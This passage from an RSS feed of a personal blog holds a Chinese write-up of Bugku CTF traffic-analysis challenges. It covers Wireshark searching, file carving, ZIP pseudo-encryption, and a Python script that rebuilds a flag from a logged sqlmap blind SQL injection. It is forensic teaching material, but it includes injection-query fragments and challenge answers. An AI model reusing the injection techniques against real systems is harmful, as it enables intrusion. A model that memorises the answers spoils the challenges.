title="九丶sqltest"></a>九丶sqltest</h3><h3 id="十丶sqltest"><a href="#十丶sqltest" class="headerlink" title="十丶sqltest"></a>十丶sqltest</h3><h3 id="十一丶john-in-the-middle"><a href="#十一丶john-in-the-middle" class="headerlink" title="十一丶john-in-the-middle"></a>十一丶john-in-the-middle</h3><h3 id="十二丶-安洵杯-2019-Attack"><a href="#十二丶-安洵杯-2019-Attack" class="headerlink" title="十二丶[安洵杯 2019]Attack"></a>十二丶[安洵杯 2019]Attack</h3><h3 id="十三丶-SUCTF2018-followme"><a href="#十三丶-SUCTF2018-followme" class="headerlink" title="十三丶[SUCTF2018]followme"></a>十三丶[SUCTF2018]followme</h3><h3 id="十四丶voip"><a href="#十四丶voip" class="headerlink" title="十四丶voip"></a>十四丶voip</h3><h3 id="十五丶-BSidesSF2019-table-tennis"><a href="#十五丶-BSidesSF2019-table-tennis" class="headerlink" title="十五丶[BSidesSF2019]table-tennis"></a>十五丶[BSidesSF2019]table-tennis</h3><h3 id="十六丶greatescape"><a href="#十六丶greatescape" class="headerlink" title="十六丶greatescape"></a>十六丶greatescape</h3><h3 id="十七丶-CFI-CTF-2018-webLogon-capture"><a href="#十七丶-CFI-CTF-2018-webLogon-capture" class="headerlink" title="十七丶[CFI-CTF 2018]webLogon capture"></a>十七丶[CFI-CTF 2018]webLogon capture</h3><h3 id="十八丶-XMAN2018排位赛-AutoKey"><a href="#十八丶-XMAN2018排位赛-AutoKey" class="headerlink" title="十八丶[XMAN2018排位赛]AutoKey"></a>十八丶[XMAN2018排位赛]AutoKey</h3><h3 id="十九丶-SUCTF2019-protocol"><a href="#十九丶-SUCTF2019-protocol" class="headerlink" title="十九丶[SUCTF2019]protocol"></a>十九丶[SUCTF2019]protocol</h3><h3 id="二十丶-BSidesSF2019-thekey"><a href="#二十丶-BSidesSF2019-thekey" class="headerlink" title="二十丶[BSidesSF2019]thekey"></a>二十丶[BSidesSF2019]thekey</h3><h3 id="二十一丶-RCTF2019-printer"><a href="#二十一丶-RCTF2019-printer" class="headerlink" title="二十一丶[RCTF2019]printer"></a>二十一丶[RCTF2019]printer</h3><p>二十二丶</p>]]></content:encoded>
      
      <comments>http://www.yym.show/2020-06-30-BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#disqus_thread</comments>
    </item>
    
    <item>
      <title>TCP &amp;amp;&amp;amp; HTTP 报文字段解读</title>
      <link>http://www.yym.show/2020-06-27-TCP-&amp;amp;&amp;amp;-HTTP-%E6%8A%A5%E6%96%87%E5%AD%97%E6%AE%B5%E8%A7%A3%E8%AF%BB/</link>
      <guid>http://www.yym.show/2020-06-27-TCP-&amp;amp;&amp;amp;-HTTP-%E6%8A%A5%E6%96%87%E5%AD%97%E6%AE%B5%E8%A7%A3%E8%AF%BB/</guid>
      <pubDate>Sat, 27 Jun 2020 03:12:00 GMT</pubDate>
      <description>
      
      </description>
      
      
      <comments>http://www.yym.show/2020-06-27-TCP-&amp;amp;&amp;amp;-HTTP-%E6%8A%A5%E6%96%87%E5%AD%97%E6%AE%B5%E8%A7%A3%E8%AF%BB/#disqus_thread</comments>
    </item>
    
    <item>
      <title>bugku-流量分析刷题记录</title>
      <link>http://www.yym.show/2020-06-26-bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
      <guid>http://www.yym.show/2020-06-26-bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
      <pubDate>Fri, 26 Jun 2020 07:37:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;一、flag被盗&quot;&gt;&lt;a href=&quot;#一、flag被盗&quot; class=&quot;headerlink&quot; title=&quot;一、flag被盗&quot;&gt;&lt;/a&gt;一、flag被盗&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;本题要点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;wireshark数
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="一、flag被盗"><a href="#一、flag被盗" class="headerlink" title="一、flag被盗"></a>一、flag被盗</h3><p><strong>本题要点：</strong></p><ul><li>wireshark数据包搜索</li></ul><p>这道题很简单，用到了wireshark数据包搜索的功能。直接在分组字节流搜索<code>flag</code>就能得到<code>flag</code></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JevXQSg4bw58Mlt.png" alt="image-20200626151117632"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;This_is_a_f10g&#125;</span><br></pre></td></tr></table></figure><h3 id="二、中国菜刀"><a href="#二、中国菜刀" class="headerlink" title="二、中国菜刀"></a>二、中国菜刀</h3><p><strong>本题要点：</strong></p><ul><li>wireshark基本使用：http协议+追踪流+显示分组字节、binwalk基本操作</li></ul><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution-1"></a>Solution-1</h4><p>第一种解法直接追踪TCP流</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/32uSbPeR1cnDoqF.png" alt="image-20200626152515947"></p><p>发现流量包信息中包含flag.tar.gz，flag应该就包含在这个压缩包中。</p><p>使用binwalk进行分析：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200705125552060.png" alt="image-20200705125552060"></p><p>文件中包含一个压缩包，使用binwalk进行提取，并解压缩，获得flag.txt，打开文本获得flag。</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1Ok7CIKhGjlRX6u.png" alt="image-20200626153119312"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key&#123;8769fe393f2b998fa6a11afe2bfcd65e&#125;</span><br></pre></td></tr></table></figure><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution-2"></a>Solution-2</h4><p>首先拿到流量包先观察流量包，先分析http流量</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hWCuinMxKYQ1rSb.png" alt="image-20200626160534139"></p><p>先查看200 ok的包的信息</p><p>第三个ok包里有数据，查看分组字节</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RoNQS2bWaGvfJUz.png" alt="image-20200626161410941"></p><p>之前得到是一个压缩包，然后这里的X@Y是需要过滤然后解码为压缩</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200705125625797.png" alt="image-20200705125625797"></p><p>得到：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/cLwQpxYujX4Z8G6.png" alt="image-20200626161610844"></p><h3 id="三、这么多数据包"><a href="#三、这么多数据包" class="headerlink" title="三、这么多数据包"></a>三、这么多数据包</h3><p><strong>本题要点：</strong></p><ul><li>getsheel特征</li><li>应用显示过滤器规则</li></ul><p>根据提示， 我们要找到 getshell 流， 经大佬提示， 一般 getshell 流的 TCP 的报文中很可能包含 command 这个字段， 我们可以通过<code>&lt; 协议 contains &quot;内容&quot; &gt;</code>来查找 getshell 流</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/bs9lWGavKfoxTmX.png" alt="image-20200626162135100"></p><p>通过追踪TCP流得到一段base64数据</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JgWNrpdwcsG6KEC.png" alt="image-20200626162333342"></p><p>base解密得到flag</p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CCTF&#123;do_ you_like_sniffer&#125;|</span><br></pre></td></tr></table></figure><h3 id="四、手机热点"><a href="#四、手机热点" class="headerlink" title="四、手机热点"></a>四、手机热点</h3><p><strong>本题要点：</strong></p><ul><li>obex蓝牙协议</li><li>导出分组字节流</li></ul><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/9tsO7ZAH5PBEuq1.png" alt="image-20200626162552358"></p><p>首先打开流量包</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SeAQy7C8hOVcaxD.png" alt="image-20200626165952359"></p><p>题目提示没有流量只能通过共享发送到电脑，没有流量通过共享来发送到电脑无疑只有两种方式，蓝牙和usb，不考虑usb，所以可能是蓝牙，所以用到的协议应该是蓝牙协议=</p><p>因为题目提示发了点小秘密，应该是发送了文件，所以推测设备间传输了数据，由此想到蓝牙间的数据传输协议</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/aH51hwXJfz8ldAy.png" alt="image-20200627091327326"></p><p>筛选出<code>obex协议</code>流量，发现传输了一个压缩包和一张图片。</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/NLpW5sx9BKzeQVr.png" alt="image-20200627091427807"></p><p>导出分组字节流得到压缩包</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/XwumfA4aEyMjJ2k.png" alt="image-20200627091558199"></p><p>解压得到flag：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/MoW5FsHDfz9RlTA.png" alt="image-20200627091633923"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SYC&#123;this_is_bluetooth&#125;</span><br></pre></td></tr></table></figure><h3 id="五、抓到一只苍蝇"><a href="#五、抓到一只苍蝇" class="headerlink" title="五、抓到一只苍蝇"></a>五、抓到一只苍蝇</h3><p><strong>本题要点：</strong></p><ul><li>过滤post请求</li><li>去除TCP包头</li><li>伪加密</li><li>文件结构</li></ul><p>这道题较之前的题目难了很多</p><p>首先在分组字节流中尝试搜索一下<code>flag</code>，但是没有什么有用的东西，然后搜索<code>flag.</code>发现了<code>flag.txt</code></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RxFNrl2JodLfVhQ.png" alt="image-20200627152345353"></p><p>然后尝试导出http传输文件；</p><p>文件-&gt;导出对象-&gt;HTTP-&gt;save all</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ZWXTVK4QGyDvk7w.png" alt="image-20200627152618553"></p><p>没有什么有用的东西；</p><p>然后继续分析，通过将tcp-data应用为列发现进行了数据交互</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Ei7uZOr8kNwQSKt.png" alt="image-20200627153548569"></p><p>然后分析流量发现有客户端向qq邮箱传文件的流量，通过POST提交的流量，所以很容易观察到，然后可以发现有5个数据包是提交上去的。</p><p>然后先提取这5个数据包，先查看数据包大小，有四个是<code>131436bytes</code>,一个是<code>1777bytes</code></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/vsDa7JAPLZlzEoQ.png" alt="image-20200627154005706"></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Dy72ImrTbBPEWZC.png" alt="image-20200627154235530"></p><p>由于是好几个文件，需要将其合并成一个文件，这里就需要去掉相同的文件头(TCP包有文件头的，所以还得去掉文件头)</p><p>由于TCP包头长度可变，所以需要知道传输的文件大小，分组字节流中查找size 可以看到文件大小是<code>525701</code></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200627160105362.png" alt="image-20200627160105362"></p><p>131436*4+1777=527571-525701=1820/5=364需要每个文件去掉其364字节的文件头。</p><p><strong>kali linux shell命令dd</strong></p><p>命令格式为 dd if=文件名 bs=1 skip=364 of=要保存的文件名。例如dd if=1 bs=1 skip=364 of=1.1</p><p>依次把五个文件去掉文件头保存到另一文件</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/6ka3l5RHhq9PcDz.png" alt="image-20200627164058001"></p><p>然后把11-55扔到windows中</p><p>使用windows下cmd命令合并</p><p><strong>copy /B 文件1+文件2+… y.rar</strong>           这里是保存为rar，也有可能是jpg啥的</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/p5Z6GlPVqXzhWRu.png" alt="image-20200627161042435"></p><p>然后得到一个压缩包，但是在Windows下打开失败，这里是因为这个压缩包伪加密了，可以winhex改一下，也可以使用binwalk分离</p><p>84 90 改为 80 94</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/TDmHYJSU6C1seix.png" alt="image-20200627165517727"></p><p>binwalk分离</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/klbSYZywaOKA2NL.png" alt="image-20200627165610824"></p><p>但是打开了确是乱码，分析文件有972kb，可能是个可执行文件，可能文件结构上藏图片什么了。</p><p>先将<code>txt</code>改为<code>exe</code>，得到的是一堆苍蝇</p><p>然后再用<code>foremost</code>分离文件，我也不清楚为什么<code>binwalk</code>为什么分离不出来，就分离出来一堆压缩包</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/NrV38SyKTOMkoZY.png" alt="image-20200627170211613"></p><p>然后得到二维码，扫码得flag</p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;m1Sc_oxO2_Fly&#125;</span><br></pre></td></tr></table></figure><h3 id="六、日志审计"><a href="#六、日志审计" class="headerlink" title="六、日志审计"></a>六、日志审计</h3><p><strong>本题要点：</strong></p><ul><li>熟悉SQL注入流程</li><li>脚本</li></ul><p>下载压缩包，解压得到日志，很明显是一个sql注入的日志。先url解码一下，百分号看的头痛</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/oeZ4X2ivNa9xWsB.png" alt="image-20200627172022735"></p><p>然后先搜索一下flag，发现这里貌似在爆破flag，然后注意后面的状态码，可以知道哪些是成功爆破出来了</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/dfaZ5DhjKQztHvx.png" alt="image-20200627172203426"></p><p>然后我是直接去判断，脚本是不会写的，只能手动才能维持的了这样子，不过还好就那几个字，首先分析得到一串<code>ascii</code>码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">102 108 97 103 123 115 113 108 109 52 112 95 49 53 95 112 48 119 101 114 102 117 108 125 1</span><br></pre></td></tr></table></figure><p>然后<code>ascii码</code>转字符串得到flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;102 108 97 103 123 115 113 108 109 52 112 95 49 53 95 112 48 119 101 114 102 117 108 125 1&quot;;</span><br><span class="line">$b &#x3D; explode(&quot; &quot;,$a);</span><br><span class="line">$c &#x3D; substr_count($a,&#39; &#39;);</span><br><span class="line">for ($i&#x3D;0;$i&lt;&#x3D;$c;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    $d &#x3D; intval($b[$i]);</span><br><span class="line">    echo chr($d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;sqlm4p_15_p0werful&#125;</span><br></pre></td></tr></table></figure><h3 id="七、weblogic"><a href="#七、weblogic" class="headerlink" title="七、weblogic"></a>七、weblogic</h3><p><strong>本题要点：</strong></p><ul><li>分组字节流搜索</li></ul><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/o328gSLxMPHq7DN.png" alt="image-20200627200946373"></p><p>题目提示找出主机名，主机名为16进制</p><p>然后根据提示搜索分组字节流，搜索<code>hostname</code>得到两个结果</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/xzy4X1FQhoR67Ov.png" alt="image-20200628073829188"></p><p>然后尝试追踪tcp流，搜索<code>hostname</code>，因为题目提示主机为16进制，所以很容易发现下面有串16进制字符，加上flag格式成功提交</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/TMzDxaHgLWdmOF6.png" alt="image-20200628074052581"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;6ad4c5a09043&#125;</span><br></pre></td></tr></table></figure><h3 id="七、信息提取"><a href="#七、信息提取" class="headerlink" title="七、信息提取"></a>七、信息提取</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hOkexWwLCd6GmUc.png" alt="image-20200628081946781"></p><p><strong>本题要点：</strong></p><ul><li>熟悉SQL语句</li><li>编写python脚本能力</li></ul><p>因为题目提示是sqlmap跑的，然后观察流量包，发现GET请求挺多，就应该是一个GET请求的注入，然后就先过滤一下http协议得到：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200629150715955.png" alt="image-20200628195800029"></p><p>得到了注入语句和回显，然后根据返回的状态码都是200，所以推测<code>sqlmap</code>是根据<code>包长</code>来判断回显。</p><p>然后就是先导出流量分析准备上脚本了：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200629150715955.png" alt="image-20200629150715955"></p><p>分析语句写脚本：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200629150804012.png" alt="image-20200629150804012"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re                      #正则模块</span><br><span class="line">import urllib.parse            #url编码模块</span><br><span class="line"></span><br><span class="line"># 更改为自己从wireshark提取出的csv文件地址</span><br><span class="line">f &#x3D; open(&quot;C:&#x2F;Users&#x2F;yiming&#x2F;Desktop&#x2F;222.csv&quot;)</span><br><span class="line">lines &#x3D; f.readlines()</span><br><span class="line">datas &#x3D; []</span><br><span class="line"># 转码, 保存进datas</span><br><span class="line">for line in lines:</span><br><span class="line">    datas.append(urllib.parse.unquote(line))      # urllib.parse.unquote是url解码</span><br><span class="line">                                                  # append() 方法用于在列表末尾添加新的对象。因为datas是空列表相当于转存</span><br><span class="line"></span><br><span class="line">lines &#x3D; []     # 这个lines保存注入flag的url</span><br><span class="line"># 提取出注入flag的url,len(datas)为列数，find() 方法检测字符串中是否包含子字符串，如果包含，返回索引值，datas[i:]返回所有提取flag的url</span><br><span class="line">for i in range(len(datas)):</span><br><span class="line">    if datas[i].find(&quot;isg.flags ORDER BY &#96;value&#96; LIMIT 0,1),1,1))&gt;64&quot;) &gt; 0:             </span><br><span class="line">        lines &#x3D; datas[i:]</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">#Python 正则表达式</span><br><span class="line">#正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。</span><br><span class="line">#Python 自1.5版本起增加了re 模块，它提供 Perl 风格的正则表达式模式。</span><br><span class="line">#re 模块使 Python 语言拥有全部的正则表达式功能。</span><br><span class="line">#compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。</span><br><span class="line">#re.match函数</span><br><span class="line">#re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</span><br><span class="line">#re.search方法</span><br><span class="line">#re.search 扫描整个字符串并返回第一个成功的匹配。</span><br><span class="line">#re.match与re.search的区别</span><br><span class="line">#re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</span><br><span class="line">#re.compile 函数</span><br><span class="line"># compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</span><br><span class="line">#group(num&#x3D;0)匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</span><br><span class="line"># 用正则匹配</span><br><span class="line">flag &#x3D; &#123;&#125;</span><br><span class="line">macth1 &#x3D; re.compile(&quot;LIMIT 0,1\),(\d*),1\)\)&gt;(\d*) HTTP&#x2F;1.1&quot;)</span><br><span class="line">macth2 &#x3D; re.compile(&quot;localhost\&quot;,\&quot;HTTP\&quot;,\&quot;(\d&#123;3&#125;)&quot;)        #匹配字符串中有 HTTP 和 （\d*）和 HTTP&#x2F;1.1 200 ok的字符串，这三个条件用 逗号 分隔</span><br><span class="line">for i in range(0, len(lines), 2):                        # 因为有返回响应, 所以步长为2</span><br><span class="line">    get1 &#x3D; macth1.search(lines[i])</span><br><span class="line">    if get1:</span><br><span class="line">        key &#x3D; int(get1.group(1))  # key保存字符的位置.</span><br><span class="line">        # get1的值为：&lt;re.Match object; span&#x3D;(168, 196), match&#x3D;&#39;LIMIT 0,1),1,1))&gt;64 HTTP&#x2F;1.1&#39;&gt;</span><br><span class="line">        #get1的值是一个对象，get1.group（1）所匹配到的值是（\d&#123;3&#125;）,提取的是括号内的内容，get1.group(0)返回所有匹配字符</span><br><span class="line">        value &#x3D; int(get1.group(2))  # value保存字符的ascii编码</span><br><span class="line">        get2 &#x3D; macth2.search(lines[i + 1])</span><br><span class="line">        if get2:</span><br><span class="line">            if int(get2.group(1)) &gt; 450:</span><br><span class="line">                value +&#x3D;1</span><br><span class="line">        flag[key] &#x3D; value        # 用字典保存flag</span><br><span class="line">f.close()</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">for value in flag.values():</span><br><span class="line">    result +&#x3D; chr(value)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ISG&#123;BLind_SQl_InJEcTi0N_DeTEcTEd&#125;</span><br></pre></td></tr></table></figure><h3 id="八、特殊后门"><a href="#八、特殊后门" class="headerlink" title="八、特殊后门"></a>八、特殊后门</h3><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/30/zEUkFbhejytuDIo.png" alt="image-20200630091114581"></p><p><strong>本题要点：</strong></p><ul><li>搜索分组字节流</li></ul><p>一步直接秒杀，辣鸡题目</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630094448738.png" alt="image-20200630094448738"></p><p>然后之后的icmp数据包就是flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630094536518.png" alt="image-20200630094536518"></p><p>最终拼接字符串得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;Icmp_backdoor_can_transfer-some_infomation&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://www.yym.show/2020-06-26-bugku-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
